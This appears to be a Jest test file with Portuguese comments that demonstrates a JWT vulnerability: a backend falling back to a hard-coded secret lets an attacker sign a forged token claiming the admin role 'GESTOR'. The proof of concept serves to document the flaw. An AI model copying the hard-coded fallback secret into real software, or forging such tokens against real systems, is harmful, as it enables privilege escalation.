import jwt from 'jsonwebtoken';

describe('Vulnerabilidades de Segurança: JWT Fallback', () => {
  it('deve conseguir forjar um token de admin explorando o fallback do secret', () => {
    // O atacante descobriu que o sistema usa esse secret quando a variável de ambiente falha
    const JWT_SECRET_VAZADO = 'fallback_secret_development';
    
    // O atacante forja um payload dizendo que é o Administrador GESTOR
    const payloadForjado = {
      sub: 'id-falso-do-admin',
      papel: 'GESTOR'
    };

    // O atacante assina o token ele mesmo
    const tokenMalicioso = jwt.sign(payloadForjado, JWT_SECRET_VAZADO);

    // O sistema backend tentaria verificar o token usando o mesmo secret falho
    const decoded = jwt.verify(tokenMalicioso, JWT_SECRET_VAZADO) as any;

    // Prova matemática de que a falha existe e o token foi aceito
    expect(decoded.papel).toBe('GESTOR');
    expect(decoded.sub).toBe('id-falso-do-admin');
  });
});